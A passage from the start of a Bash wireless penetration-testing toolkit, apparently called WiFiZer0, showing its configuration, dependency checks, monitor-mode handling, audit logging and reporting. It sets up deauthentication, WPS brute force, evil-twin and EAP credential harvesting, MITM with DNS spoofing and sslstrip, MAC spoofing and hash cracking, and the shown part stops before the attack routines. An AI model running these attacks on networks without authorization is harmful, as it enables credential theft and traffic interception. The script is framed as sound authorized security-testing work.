#!/usr/bin/env bash
# ============================================================
#  wifi_pentest.sh — Wireless Penetration Testing Toolkit
#  Version : 3.0
#  Platform: Kali Linux
#
#  FOR AUTHORIZED PENETRATION TESTING ONLY.
#  Ensure written permission before use.
# ============================================================

# ────────────────────────────────────────────────────────────
#  TAB MODE HANDLER
#  Invoked as: wifi_pentest.sh --tab <FUNC> <ENV_FILE>
#  Must appear before any interactive code so the tab
#  subprocess skips setup, loads env, and runs its function.
# ────────────────────────────────────────────────────────────
_TAB_MODE=0
if [[ "${1:-}" == "--tab" ]]; then
    _TAB_FUNC="${2:-}"
    _TAB_ENV="${3:-}"
    _TAB_MODE=1
fi

# ────────────────────────────────────────────────────────────
#  GLOBALS
# ────────────────────────────────────────────────────────────
VERSION="3.0"
OUTPUT_DIR="./wpt_output"
TMPDIR_PT=""          # set via mktemp in normal path; loaded from env in tab mode
AUDIT_LOG=""          # set at startup; shared with tab subprocesses via env file
SESSION_START=""      # ISO timestamp set at startup
DIALOGRC_BACKUP=""
EAPHAMMER=""
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
VENV_DIR="${SCRIPT_DIR}/venv"
VENV_PYTHON="${VENV_DIR}/bin/python3"
ENTERPRISE_CONF="${SCRIPT_DIR}/eaphammer_enterprise.conf"
EAP_ACTIVE_CERT="/etc/eaphammer/certs/active/fullchain.pem"
TMUX_SESSION="wifizer0"
TMUX_AVAILABLE=0
SELECTED_IFACE=""

# ── Dual-band session context ─────────────────────────────
# SELECTED_BAND controls which frequencies are scanned/attacked
#   "2.4"  — 2.4 GHz only  (channels 1-14,  airodump --band bg)
#   "5"    — 5 GHz only    (channels 36-165, airodump --band a)
#   "dual" — both bands    (channels 1-14 + 36-165, airodump --band abg)
SELECTED_BAND="2.4"
# GLOBAL_IFACE — default interface pre-selected in every task picker.
# User can still override per task. Empty = no default (picker opens fresh).
GLOBAL_IFACE=""

declare -A RUNNING_TASKS   # [win_id]="label|logfile|mon_iface"
declare -a MON_INTERFACES  # all monitor interfaces created this session

TARGET_BSSID=""
TARGET_SSID=""
TARGET_CHANNEL=""
TARGET_ENC=""
TARGET_AUTH=""    # PSK / MGT / SAE — parsed from airodump Authentication field

# Extra params written into env file before spawning a tab
TAB_TIMEOUT="60"
TAB_ROGUE_PSK=""
TAB_NEGOTIATE="balanced"
TAB_WPA_VER="2"
TAB_CAP_HS="no"
TAB_PHASE1="PEAP,TTLS,TLS,FAST"          # Phase 1 outer methods (negotiate=manual only)
TAB_PHASE2="GTC,MSCHAPV2,TTLS-MSCHAPV2,TTLS-PAP,MD5"  # Phase 2 inner methods
_EAP_CERT_CHANGED=0                        # set to 1 by eap_wizard when cert fields change
TAB_DEAUTH_COUNT=10                        # number of deauth frames (0 = continuous)
TAB_DEAUTH_CLIENT=""                       # target client MAC (empty = broadcast all)
TAB_PROBE_DUR=60                           # probe capture duration in seconds
TAB_PORTAL_SSID=""
TAB_PORTAL_CHANNEL="6"

# WPS attack params
TAB_WPS_METHOD="pixiedust"   # pixiedust | bruteforce | pin
TAB_WPS_PIN=""               # specific 8-digit PIN (method=pin only)

# Bettercap MITM params
TAB_MITM_GW=""               # gateway IP (blank = auto-detect)
TAB_MITM_TARGETS=""          # comma-separated target IPs (blank = all)
TAB_MITM_DNS="no"            # enable dns.spoof
TAB_MITM_SSL="no"            # enable http.proxy sslstrip

# Hashcat cracking params
TAB_HC_FILE=""               # path to .hc22000 or eap_creds log
TAB_HC_HASH_TYPE="22000"     # 22000=WPA2, 5600=MSCHAPv2
TAB_HC_WORDLIST="/usr/share/wordlists/rockyou.txt"
TAB_HC_MODE="wordlist"       # wordlist | rules | mask | full

# ── Persistent session / database paths (set at startup) ─────
SESSION_FILE=""   # OUTPUT_DIR/session.sh   — current engagement target state
AP_DB=""          # OUTPUT_DIR/ap_database.tsv  — all APs ever seen
CLIENT_DB=""      # OUTPUT_DIR/client_database.tsv — all clients ever seen

# ── Enriched target context (populated on scan / DB load) ─────
TARGET_CLIENT_COUNT=0   # clients seen on target AP at last scan or DB load
TARGET_VENDOR=""        # OUI vendor name of target AP MAC prefix
LAST_IFACE=""           # last interface chosen — pre-selected on next pick
DEP_OK_STAMP=""         # full path to dep-check pass stamp (set at startup)

# ── Feature 1: MAC Address Spoofing ──────────────────────────
MAC_SPOOF_ENABLED=0          # 0=off (default), 1=on
MAC_SPOOF_MODE="random"      # random | specific | preserve
MAC_SPOOF_ADDR=""            # specific MAC when mode=specific
declare -A ORIGINAL_MACS     # [iface]=original_mac

# ── Feature 3: Scope Enforcement ─────────────────────────────
SCOPE_FILE=""                # set at startup: OUTPUT_DIR/scope.txt
SCOPE_ENFORCED=1             # 1=warn on out-of-scope, 0=disabled

# ── Feature 5: PSK Verification ──────────────────────────────
TAB_PSK_VERIFY_SSID=""
TAB_PSK_VERIFY_BSSID=""
TAB_PSK_VERIFY_PSK=""
TAB_PSK_VERIFY_IFACE=""

# ── Feature 6: Hidden SSID Discovery ─────────────────────────
TAB_HIDDEN_MON_IFACE=""
TAB_HIDDEN_TARGET_BSSID=""

# ── Feature 9: TX Power Control ──────────────────────────────
TX_POWER_DBM=20              # current session TX power in dBm
declare -A ORIGINAL_TXPOWER  # [iface]=original_dBm_value

# ── Feature 10: Wordlist Manager ─────────────────────────────
TAB_WL_TARGET_SSID=""
TAB_WL_COMPANY=""
TAB_WL_URL=""
TAB_WL_FILE=""

# ── Feature 12: Engagement Profiles ──────────────────────────
ACTIVE_PROFILE="default"
PROFILES_DIR=""              # set at startup: OUTPUT_DIR/profiles/

# ── Feature 13: WEP Attack Suite ──────────────────────────────
TAB_WEP_METHOD=""          # arp|frag|chopchop|auto
TAB_WEP_IV_THRESHOLD=15000 # IVs needed before aircrack-ng attempt

# ── Feature 14: KARMA/MANA Evil Twin ──────────────────────────
TAB_KARMA_MODE=""          # open|wpa
TAB_KARMA_SSIDS=""         # comma-list or "any"
TAB_KARMA_CHANNEL=""       # channel for hostapd-wpe
TAB_KARMA_PSK=""           # PSK for wpa mode (optional)
HOSTAPD_WPE=""             # path resolved by find_hostapd_wpe()

# ── Feature 15: Auto Attack Pipeline ──────────────────────────
TAB_AUTO_MODE=""           # pmkid|handshake|both
TAB_AUTO_TIMEOUT_PMKID=90  # seconds for PMKID phase
TAB_AUTO_TIMEOUT_HS=120    # seconds for handshake phase
TAB_AUTO_WORDLIST=""       # path to wordlist
TAB_AUTO_CRACK_MODE=""     # cpu|gpu|auto

# ────────────────────────────────────────────────────────────
#  COLOR PALETTE — Claude-themed, color-blind safe
#  No red/green reliance. Uses amber + cyan + blue + magenta.
#  Distinguishable under deuteranopia, protanopia, tritanopia.
# ────────────────────────────────────────────────────────────
CY='\033[1;96m'       # Bright Cyan    — primary / borders / OK
AM='\033[0;93m'       # Bright Amber   — accent / headings
BL='\033[0;34m'       # Blue           — info / dimmer accent
MG='\033[1;95m'       # Bright Magenta — errors / alerts
YL='\033[0;33m'       # Yellow         — warnings
WH='\033[1;37m'       # Bright White   — body text
DM='\033[2;37m'       # Dim White      — secondary text
BD='\033[1m'          # Bold
NC='\033[0m'          # Reset

# Legacy aliases kept for compatibility with existing code
GREEN="$CY"
RED="$MG"
CYAN="$CY"
YELLOW="$AM"
BLUE="$BL"
MAGENTA="$MG"
BOLD="$BD"

# ────────────────────────────────────────────────────────────
#  DIALOG COLOR THEME — Claude amber/cyan, color-blind safe
# ────────────────────────────────────────────────────────────
write_dialogrc() {
    if [[ -f "$HOME/.dialogrc" ]]; then
        DIALOGRC_BACKUP="$(mktemp)"
        cp "$HOME/.dialogrc" "$DIALOGRC_BACKUP"
    fi
    cat > "$HOME/.dialogrc" << 'DIALOGEOF'
aspect = 0
separate_widget = ""
tab_len = 0
visit_items = OFF
use_shadow = ON
use_colors = ON
screen_color        = (WHITE,BLACK,OFF)
shadow_color        = (BLACK,BLACK,ON)
dialog_color        = (WHITE,BLACK,OFF)
title_color         = (YELLOW,BLACK,ON)
border_color        = (CYAN,BLACK,ON)
button_active_color = (BLACK,CYAN,ON)
button_inactive_color = (WHITE,BLACK,OFF)
button_key_active_color = (BLACK,CYAN,ON)
button_key_inactive_color = (YELLOW,BLACK,ON)
button_label_active_color = (BLACK,CYAN,ON)
button_label_inactive_color = (WHITE,BLACK,ON)
inputbox_color      = (WHITE,BLACK,OFF)
inputbox_border_color = (CYAN,BLACK,ON)
searchbox_color     = (WHITE,BLACK,OFF)
searchbox_title_color = (YELLOW,BLACK,ON)
searchbox_border_color = (CYAN,BLACK,ON)
position_indicator_color = (CYAN,BLACK,ON)
menubox_color       = (WHITE,BLACK,OFF)
menubox_border_color = (CYAN,BLACK,ON)
item_color          = (WHITE,BLACK,OFF)
item_selected_color = (BLACK,YELLOW,ON)
tag_color           = (CYAN,BLACK,ON)
tag_selected_color  = (BLACK,YELLOW,ON)
tag_key_color       = (CYAN,BLACK,ON)
tag_key_selected_color = (BLACK,YELLOW,ON)
check_color         = (WHITE,BLACK,OFF)
check_selected_color = (BLACK,YELLOW,ON)
uarrow_color        = (CYAN,BLACK,ON)
darrow_color        = (CYAN,BLACK,ON)
itemhelp_color      = (WHITE,BLACK,OFF)
form_active_text_color = (BLACK,CYAN,ON)
form_text_color     = (WHITE,BLACK,OFF)
form_item_readonly_color = (CYAN,BLACK,ON)
gauge_color         = (BLACK,CYAN,ON)
border2_color       = (YELLOW,BLACK,ON)
DIALOGEOF
}

restore_dialogrc() {
    if [[ -n "$DIALOGRC_BACKUP" && -f "$DIALOGRC_BACKUP" ]]; then
        cp "$DIALOGRC_BACKUP" "$HOME/.dialogrc"
        rm -f "$DIALOGRC_BACKUP"
    else
        rm -f "$HOME/.dialogrc"
    fi
}

# ────────────────────────────────────────────────────────────
#  TMUX MANAGEMENT
# ────────────────────────────────────────────────────────────
ensure_tmux() {
    if ! command -v tmux &>/dev/null; then
        dialog --title " tmux Not Found " \
               --msgbox "\n  tmux is required for multi-tab task management.\n\n  Install it:  apt install tmux\n\n  Continuing without tab support." 11 55
        TMUX_AVAILABLE=0
        return
    fi

    if [[ -z "${TMUX:-}" ]]; then
        # Not inside a tmux session — offer to launch one
        dialog --title " Multi-Tab Mode " \
               --yesno "\n  WiFiZer0 uses tmux to run each attack\n  in its own named tab.\n\n  Launch inside a new tmux session now?\n  (Recommended — enables tab switching)" \
               11 55
        if [[ $? -eq 0 ]]; then
            restore_dialogrc
            exec tmux new-session -s "$TMUX_SESSION" \
                 -n "Main" \
                 "bash '${BASH_SOURCE[0]}'"
        fi
        TMUX_AVAILABLE=0
    else
        TMUX_AVAILABLE=1
        configure_tmux
    fi
}

configure_tmux() {
    # ── Status bar — Claude amber/cyan/dark theme ──────────────
    tmux set-option -g status                    on
    tmux set-option -g status-interval           2
    tmux set-option -g status-position           bottom
    tmux set-option -g status-bg                 colour234   # #1c1c1c dark
    tmux set-option -g status-fg                 colour252   # #d0d0d0 light text
    # Left: session label in amber
    tmux set-option -g status-left \
        "#[bg=colour208,fg=colour234,bold] WiFiZer0 #[bg=colour234,fg=colour208] #S #[default] "
    tmux set-option -g status-left-length        30
    # Right: time in cyan
    tmux set-option -g status-right \
        "#[fg=colour33] %H:%M #[fg=colour252]| #[fg=colour208]$(date +%F) "
    tmux set-option -g status-right-length       30
    # Inactive window tabs
    tmux set-window-option -g window-status-format \
        " #[fg=colour245]#I:#[fg=colour252]#W "
    # Active window tab — amber on dark-blue
    tmux set-window-option -g window-status-current-format \
        "#[bg=colour33,fg=colour208,bold] #I:#W #[default]"
    # Borders
    tmux set-option -g pane-border-style         "fg=colour238"
    tmux set-option -g pane-active-border-style  "fg=colour33"
    # Messages (bottom bar alerts)
    tmux set-option -g message-style             "bg=colour208,fg=colour234,bold"
    # Prevent tools from renaming windows
    tmux set-option -g allow-rename              off
    tmux set-window-option -g automatic-rename   off
    # Mouse support for clicking tabs
    tmux set-option -g mouse                     on
}

# ────────────────────────────────────────────────────────────
#  CLEANUP  (runs on EXIT, INT, TERM)
# ────────────────────────────────────────────────────────────
cleanup() {
    # ── Terminate background processes (SIGTERM → wait → SIGKILL) ──
    for pid in "${!RUNNING_TASKS[@]}"; do
        IFS='|' read -r _lbl _log mon_val <<< "${RUNNING_TASKS[$pid]}"
        if [[ "$mon_val" != tmux:* ]]; then
            kill -TERM "$pid" 2>/dev/null || true
        fi
    done
    sleep 1
    for pid in "${!RUNNING_TASKS[@]}"; do
        IFS='|' read -r _lbl _log mon_val <<< "${RUNNING_TASKS[$pid]}"
        if [[ "$mon_val" != tmux:* ]]; then
            kill -0 "$pid" 2>/dev/null && kill -KILL "$pid" 2>/dev/null || true
        fi
    done

    # ── Restore all monitor-mode interfaces ──────────────────────
    for mon in "${MON_INTERFACES[@]}"; do
        airmon-ng stop "$mon" &>/dev/null || true
    done

    # ── Restore original MAC addresses ───────────────────────────
    for iface in "${!ORIGINAL_MACS[@]}"; do
        restore_mac "$iface" 2>/dev/null || true
    done

    # ── Restore original TX power ─────────────────────────────────
    for iface in "${!ORIGINAL_TXPOWER[@]}"; do
        restore_tx_power "$iface" 2>/dev/null || true
    done

    audit_log "SESSION END: WiFiZer0 exiting"
    generate_session_report

    rm -rf "$TMPDIR_PT"
    restore_dialogrc
    clear
    echo -e "${CY}[+]${NC} Cleanup complete. All interfaces restored."
}
trap cleanup EXIT INT TERM

# ────────────────────────────────────────────────────────────
#  TAB OUTPUT HELPERS  (used inside tab subprocess windows)
# ────────────────────────────────────────────────────────────
_line() { printf "${CY}  %s${NC}\n" "$(printf '─%.0s' {1..60})"; }
t_head() { echo; printf "${AM}${BD}  ╔══ %s ══╗${NC}\n" "$*"; echo; }
t_ok()   { printf "${CY}  [+]${NC} %s\n" "$*"; }
t_info() { printf "${BL}  [*]${NC} %s\n" "$*"; }
t_warn() { printf "${YL}  [!]${NC} %s\n" "$*"; }
t_err()  { printf "${MG}  [-]${NC} %s\n" "$*"; }
t_data() { printf "${DM}      %s${NC}\n" "$*"; }
t_cmd()  { printf "${AM}  \$${NC} ${WH}%s${NC}\n" "$*"; }

# ────────────────────────────────────────────────────────────
#  BANNER
# ────────────────────────────────────────────────────────────
draw_banner() {
    # Pass --no-clear to suppress screen clear (used in main_menu loop
    # to avoid flicker; attack launchers omit the flag and get a clean screen)
    [[ "${1:-}" != "--no-clear" ]] && clear
    printf "${AM}${BD}"
    if command -v figlet &>/dev/null; then
        figlet -f slant "WiFiZer0" | sed 's/^/  /'
    else
        echo "  __        ___ _______ _____             ____ "
        echo "  | |     / (_) ____(_)__  /  ___  _____/ __ \\"
        echo "  | | /| / / / /_  / /  / /  / _ \/ ___/ / / /"
        echo "  | |/ |/ / / __/ / /  / /__/  __/ /  / /_/ / "
        echo "  |__/|__/_/_/   /_/  /____/\___/_/   \____/  "
    fi
    printf "${NC}"
    printf "  ${CY}Wireless Penetration Testing Toolkit ${AM}v${VERSION}${NC}\n"
    printf "  ${DM}──────────────────────────────────────────────────────${NC}\n"
    printf "  ${WH}Automated WiFi security assessment platform for${NC}\n"
    printf "  ${WH}authorized penetration testing engagements.${NC}\n"
    printf "  ${DM}Covers: WPA2/WPA3 handshake · PMKID · WPS Pixie Dust${NC}\n"
    printf "  ${DM}         EAP credential harvest · captive portal · MITM${NC}\n"
    printf "  ${DM}         offline hash cracking  —  all from one TUI${NC}\n"
    printf "  ${DM}──────────────────────────────────────────────────────${NC}\n"
    printf "  ${YL}For authorized testing only. Ensure written permission.${NC}\n"
    local ifaces
    ifaces=$(iw dev 2>/dev/null | awk '/Interface/{printf $2" "}' || echo "none")
    local task_count=${#RUNNING_TASKS[@]}
    local tmux_hint=""
    if [[ $TMUX_AVAILABLE -eq 1 ]]; then
        local win_count
        win_count=$(tmux list-windows 2>/dev/null | wc -l)
        tmux_hint="  ${AM}Ctrl+b [n]${NC} next tab  ${AM}Ctrl+b [0-9]${NC} jump  ${AM}${win_count}${NC} windows open"
    fi
    local band_display; band_display=$(band_label)
    local iface_display="${GLOBAL_IFACE:-auto}"
    printf "  ${BL}[Adapters: ${ifaces:-none}]${NC}  ${CY}[Session: ${iface_display} | ${band_display}]${NC}  ${AM}[Tasks: ${task_count}]${NC}  ${YL}[Profile: ${ACTIVE_PROFILE}]${NC}\n"
    [[ -n "$tmux_hint" ]] && printf "%s\n" "$tmux_hint"

    # ── Live tab mini-list — names of running tmux windows ───────
    if [[ $TMUX_AVAILABLE -eq 1 ]]; then
        local tab_list="" tab_n=0 wline wname
        while IFS= read -r wline; do
            [[ "$wline" == 0:* ]] && continue   # skip the Main window
            wname="${wline#*:}"
            tab_list+=" ${wname} |"
            (( tab_n++ )) || true
        done < <(tmux list-windows -F "#{window_index}:#{window_name}" 2>/dev/null)
        if [[ $tab_n -gt 0 ]]; then
            printf "  ${DM}↳ tabs: ${tab_list% |}${NC}\n"
        fi
    fi

    printf "  ${CY}%s${NC}\n\n" "$(printf '─%.0s' {1..54})"
}

# ────────────────────────────────────────────────────────────
#  ROOT CHECK
# ────────────────────────────────────────────────────────────
check_root() {
    if [[ $EUID -ne 0 ]]; then
        dialog --title " Permission Error " \
               --msgbox "\n  This script must be run as root.\n\n  Run:  sudo ./wifi_pentest.sh" \
               8 48
        exit 1
    fi
}

# ────────────────────────────────────────────────────────────
#  PYTHON VENV SETUP
# ────────────────────────────────────────────────────────────
setup_venv() {
    local req_file="${SCRIPT_DIR}/requirements.txt"
    local needs_install=0

    if [[ ! -d "$VENV_DIR" ]]; then
        dialog --title " Python Virtual Environment " \
               --infobox "\n  Creating venv at:\n  $VENV_DIR\n\n  Please wait ..." \
               9 58
        python3 -m venv "$VENV_DIR"
        needs_install=1
    fi

    if [[ ! -f "$VENV_PYTHON" ]]; then
        dialog --title " Venv Error " \
               --msgbox "\n  Failed to create Python venv.\n  Ensure python3-venv is installed:\n  apt install python3-venv" \
               9 55
        return 1
    fi

    if [[ $needs_install -eq 1 && -f "$req_file" ]]; then
        dialog --title " Installing Python Dependencies " \
               --infobox "\n  Installing packages into venv ...\n\n  $VENV_DIR" 8 55
        "$VENV_DIR/bin/pip" install --quiet -r "$req_file" &>/dev/null || true
    fi

    local pkg_check
    pkg_check=$("$VENV_PYTHON" -c "
import importlib.util, sys
pkgs = ['flask','flask_cors','flask_socketio','OpenSSL','bs4','tqdm','pem','pywebcopy']
missing = [p for p in pkgs if not importlib.util.find_spec(p)]
print(','.join(missing) if missing else 'OK')
" 2>/dev/null || echo "check_failed")

    if [[ "$pkg_check" == "OK" ]]; then
        audit_log "VENV OK: all Python packages verified in $VENV_DIR"
    elif [[ "$pkg_check" == "check_failed" ]]; then
        dialog --title " Venv Warning " \
               --msgbox "\n  Could not validate venv packages.\n  EAPHammer features may have issues." 8 52
    else
        dialog --title " Missing Packages " \
               --msgbox "\n  Installing missing packages: $pkg_check" 8 58
        "$VENV_DIR/bin/pip" install --quiet -r "$req_file" &>/dev/null || true
    fi
}

# ────────────────────────────────────────────────────────────
#  DEPENDENCY CHECK
# ────────────────────────────────────────────────────────────
check_dependencies() {
    local tools=(airmon-ng airodump-ng aireplay-ng aircrack-ng
                 hcxdumptool hcxpcapngtool tshark dialog iw tmux
                 reaver bully bettercap hashcat packetforge-ng
                 macchanger wpa_supplicant wpa_cli arp-scan nmap)
    local check_output=""
    local missing=()

    for tool in "${tools[@]}"; do
        if command -v "$tool" &>/dev/null; then
            check_output+="  [OK]  $tool\n"
        else
            check_output+="  [!!]  $tool  <- NOT FOUND\n"
            missing+=("$tool")
        fi
    done

    local _local_eap="${SCRIPT_DIR}/WiFiZer0_Tools/eaphammer/eaphammer"
    local _wrapper="${SCRIPT_DIR}/WiFiZer0_Tools/eaphammer_wrapper.sh"
    EAPHAMMER=$(
        { [[ -x "$_local_eap" ]] && echo "$_local_eap"; } \
        || { [[ -x "$_wrapper"  ]] && echo "$_wrapper";  } \
        || command -v eaphammer 2>/dev/null \
        || { [[ -x "/opt/eaphammer/eaphammer" ]] && echo "/opt/eaphammer/eaphammer"; } \
        || echo "")
    if [[ -n "$EAPHAMMER" ]]; then
        check_output+="  [OK]  eaphammer  ($EAPHAMMER)\n"
    else
        check_output+="  [!!]  eaphammer  <- NOT FOUND  (run: sudo bash install.sh)\n"
        missing+=("eaphammer")
    fi

    # ── hostapd-wpe optional detection (KARMA/MANA feature) ──────
    if find_hostapd_wpe; then
        check_output+="  [OK]  hostapd-wpe  ($HOSTAPD_WPE)\n"
    else
        check_output+="  [>>]  hostapd-wpe  <- not found  (optional: needed for KARMA/MANA Evil Twin)\n"
    fi

    if [[ -f "$VENV_PYTHON" ]]; then
        check_output+="  [OK]  python3 venv  ($VENV_DIR)\n"
    else
        check_output+="  [!!]  python3 venv  <- NOT FOUND\n"
    fi

    # ── Adapter count advisory ────────────────────────────────────
    local adapter_list=()
    mapfile -t adapter_list < <(iw dev 2>/dev/null | awk '/Interface/{print $2}')
    local adapter_count=${#adapter_list[@]}
    local adapter_note=""
    if [[ $adapter_count -eq 0 ]]; then
        adapter_note="  [!!]  Wireless adapters : NONE DETECTED\n"
        adapter_note+="        Plug in a monitor-mode capable USB adapter.\n"
    elif [[ $adapter_count -eq 1 ]]; then
        adapter_note="  [>>]  Wireless adapters : 1 detected (${adapter_list[0]})\n"
        adapter_note+="        Recommended: 2-3 adapters for full coverage.\n"
        adapter_note+="        See Help > Adapters for top picks.\n"
    else
        adapter_note="  [OK]  Wireless adapters : $adapter_count detected (${adapter_list[*]})\n"
    fi
    check_output+="$adapter_note"

    if [[ ${#missing[@]} -gt 0 ]]; then
        # Always show dialog when tools are missing — remove stale stamp
        [[ -n "$DEP_OK_STAMP" ]] && rm -f "$DEP_OK_STAMP" 2>/dev/null || true
        dialog --title " Dependency Check " \
               --msgbox "$(printf '%b' "$check_output")\n\n  Missing: ${missing[*]}\n  Some features unavailable." \
               $(( ${#tools[@]} + 16 )) 66
    elif [[ -n "$DEP_OK_STAMP" ]] && \
         [[ -n "$(find "$DEP_OK_STAMP" -mmin -1440 2>/dev/null)" ]]; then
        # All pass and stamp is < 24 h old — skip dialog silently
        audit_log "DEP CHECK: all pass (stamp fresh — dialog suppressed)"
    else
        # All pass on this launch — show once and write stamp
        dialog --title " Dependency Check " \
               --msgbox "$(printf '%b' "$check_output")\n\n  All dependencies satisfied!" \
               $(( ${#tools[@]} + 14 )) 66
        [[ -n "$DEP_OK_STAMP" ]] && touch "$DEP_OK_STAMP" 2>/dev/null || true
    fi
}

# ────────────────────────────────────────────────────────────
#  INTERFACE MANAGEMENT
# ────────────────────────────────────────────────────────────
discover_interfaces() {
    iw dev 2>/dev/null | awk '/Interface/{print $2}'
}

pick_interface() {
    local prompt="${1:-Select wireless interface for this task:}"
    local -a ifaces
    mapfile -t ifaces < <(discover_interfaces)

    if [[ ${#ifaces[@]} -eq 0 ]]; then
        dialog --title " No Interfaces " \
               --msgbox "\n  No wireless interfaces found.\n  Plug in a wireless adapter and retry." 8 52
        return 1
    fi

    local menu_items=()
    for iface in "${ifaces[@]}"; do
        local phy mode
        phy=$(iw dev "$iface" info 2>/dev/null | awk '/wiphy/{print "phy"$2}' || echo "?")
        mode=$(iw dev "$iface" info 2>/dev/null | awk '/type/{print $2}' || echo "?")
        menu_items+=("$iface" "  ${phy}  |  mode: ${mode}")
    done

    local max_h=$(( $(tput lines 2>/dev/null || echo 24) - 4 ))
    local dlg_h=$(( ${#ifaces[@]} + 9 ))
    [[ $dlg_h -gt $max_h ]] && dlg_h=$max_h
    local chosen
    # Pre-select: GLOBAL_IFACE > LAST_IFACE (GLOBAL set via Session Settings)
    local preselect="${GLOBAL_IFACE:-${LAST_IFACE:-}}"
    chosen=$(dialog --title " Select Wireless Interface  [Band: $(band_label)] " \
           --default-item "$preselect" \
           --menu "\n  $prompt\n  Active band: $(band_label) — change via Session Settings\n" \
           "$dlg_h" 64 "${#ifaces[@]}" \
           "${menu_items[@]}" \
           3>&1 1>&2 2>&3) || return 1
    LAST_IFACE="$chosen"
    echo "$chosen"
}

put_in_monitor() {
    local iface="$1"
    # MAC spoofing before monitor mode (if enabled)
    if [[ "${MAC_SPOOF_ENABLED:-0}" -eq 1 ]]; then
        spoof_mac "$iface"
    fi
    airmon-ng check kill &>/dev/null || true
    sleep 1
    local result
    result=$(airmon-ng start "$iface" 2>&1)
    local mon
    mon=$(echo "$result" | grep -oP '\(monitor mode enabled on \K[^\)]+' 2>/dev/null \
        || iw dev 2>/dev/null | awk '/Interface/{i=$2} /type monitor/{print i}' | tail -1 \
        || echo "${iface}mon")
    # Verify the interface actually exists in monitor mode
    if ! iw dev "$mon" info &>/dev/null; then
        # Last-resort: scan iw dev for any monitor interface
        local fallback
        fallback=$(iw dev 2>/dev/null | awk '/Interface/{i=$2} /type monitor/{print i}' | head -1)
        if [[ -n "$fallback" ]]; then
            mon="$fallback"
        else
            t_err "Monitor interface '$mon' not found after airmon-ng start."
            t_data "Check: iw dev | grep -A3 Interface"
            t_data "Try: airmon-ng start $iface  manually"
            return 1
        fi
    fi
    MON_INTERFACES+=("$mon")
    echo "$mon"
}

restore_single_interface() {
    local mon="$1"
    restore_mac "$mon" 2>/dev/null || true
    restore_tx_power "$mon" 2>/dev/null || true
    airmon-ng stop "$mon" &>/dev/null || true
    local -a updated=()
    for m in "${MON_INTERFACES[@]}"; do
        [[ "$m" != "$mon" ]] && updated+=("$m")
    done
    MON_INTERFACES=("${updated[@]}")
}

# ────────────────────────────────────────────────────────────
#  AUDIT LOG
# ────────────────────────────────────────────────────────────
audit_log() {
    [[ -z "$AUDIT_LOG" ]] && return
    local ts; ts=$(date '+%Y-%m-%d %H:%M:%S')
    printf '[%s] %s\n' "$ts" "$*" >> "$AUDIT_LOG" 2>/dev/null || true
}

# ────────────────────────────────────────────────────────────
#  FILE INTEGRITY — SHA256 checksum beside each capture
# ────────────────────────────────────────────────────────────
hash_file() {
    local f="$1"
    [[ -f "$f" && -s "$f" ]] || return 0
    local sum; sum=$(sha256sum "$f" 2>/dev/null | awk '{print $1}')
    [[ -z "$sum" ]] && return 0
    echo "$sum  $f" > "${f}.sha256"
    audit_log "SHA256 $sum  $f"
    t_ok "SHA256 recorded: ${f}.sha256"
}

# ────────────────────────────────────────────────────────────
#  INPUT VALIDATION
# ────────────────────────────────────────────────────────────
validate_bssid() {
    # Accept both upper and lower case hex octets
    local b="${1^^}"
    [[ "$b" =~ ^([0-9A-F]{2}:){5}[0-9A-F]{2}$ ]]
}

validate_channel() {
    local ch="$1"
    [[ "$ch" =~ ^[0-9]+$ ]] || return 1
    # 2.4 GHz: 1-14;  5 GHz: 36-165 (includes all legal subchannels)
    [[ $ch -ge 1 && $ch -le 14 ]] || [[ $ch -ge 36 && $ch -le 165 ]]
}

validate_psk() {
    # WPA2 PSK must be 8-63 printable ASCII characters
    local p="$1"
    [[ ${#p} -ge 8 && ${#p} -le 63 ]]
}

validate_ssid() {
    # SSID: 1-32 bytes (non-empty, not longer than 32 chars)
    local s="$1"
    [[ ${#s} -ge 1 && ${#s} -le 32 ]]
}

# ────────────────────────────────────────────────────────────
#  OUI VENDOR LOOKUP  — resolves first 3 MAC octets to maker
# ────────────────────────────────────────────────────────────
OUI_FILE="/usr/share/ieee-data/oui.txt"

oui_lookup() {
    local mac="${1^^}"
    [[ ${#mac} -lt 8 ]] && return 0
    [[ ! -f "$OUI_FILE" ]] && return 0
    local prefix="${mac:0:2}-${mac:3:2}-${mac:6:2}"
    grep -m1 -i "^${prefix}.*hex" "$OUI_FILE" 2>/dev/null \
        | awk -F'\t' '{v=$NF; gsub(/^[[:space:]]+|[[:space:]]+$/,"",v); print v}'
}

# ────────────────────────────────────────────────────────────
#  SESSION REPORT  — written to OUTPUT_DIR on exit
# ────────────────────────────────────────────────────────────
generate_session_report() {
    [[ ! -d "$OUTPUT_DIR" ]] && return
    local report_file
    report_file="${OUTPUT_DIR}/session_report_$(date +%Y%m%d_%H%M%S).txt"
    {
        echo "=================================================="
        echo "  WiFiZer0 Session Report — v${VERSION}"
        echo "  Started : ${SESSION_START:-unknown}"
        echo "  Ended   : $(date '+%Y-%m-%d %H:%M:%S')"
        echo "  Host    : $(hostname 2>/dev/null || echo unknown)"
        echo "  Output  : ${OUTPUT_DIR}"
        echo "=================================================="
        echo ""
        echo "=== Captured Files ==="
        local found=0
        while IFS= read -r f; do
            [[ "$f" == *.sha256 ]] && continue
            local size; size=$(du -sh "$f" 2>/dev/null | cut -f1)
            echo "  [$size]  $f"
            if [[ -f "${f}.sha256" ]]; then
                echo "           SHA256: $(cut -d' ' -f1 < "${f}.sha256")"
            fi
            found=1
        done < <(find "$OUTPUT_DIR" -type f 2>/dev/null | sort)
        [[ $found -eq 0 ]] && echo "  (none)"
        echo ""
        echo "=== Audit Trail ==="
        if [[ -f "$AUDIT_LOG" ]]; then
            cat "$AUDIT_LOG"
        else
            echo "  (no audit log)"
        fi
    } > "$report_file" 2>/dev/null || return
    echo -e "${CY}[+]${NC} Session report written: ${AM}${report_file}${NC}"
}

# ────────────────────────────────────────────────────────────
#  SESSION PERSISTENCE  — save/load current engagement target
# ────────────────────────────────────────────────────────────
save_session() {
    [[ -z "$SESSION_FILE" ]] && return
    {
        echo "# WiFiZer0 Session State — $(date '+%Y-%m-%d %H:%M:%S')"
        printf 'TARGET_BSSID="%s"\n'          "$TARGET_BSSID"
        printf 'TARGET_SSID="%s"\n'           "$TARGET_SSID"
        printf 'TARGET_CHANNEL="%s"\n'        "$TARGET_CHANNEL"
        printf 'TARGET_ENC="%s"\n'            "$TARGET_ENC"
        printf 'TARGET_AUTH="%s"\n'           "$TARGET_AUTH"
        printf 'TARGET_CLIENT_COUNT="%s"\n'   "$TARGET_CLIENT_COUNT"
        printf 'TARGET_VENDOR="%s"\n'         "$TARGET_VENDOR"
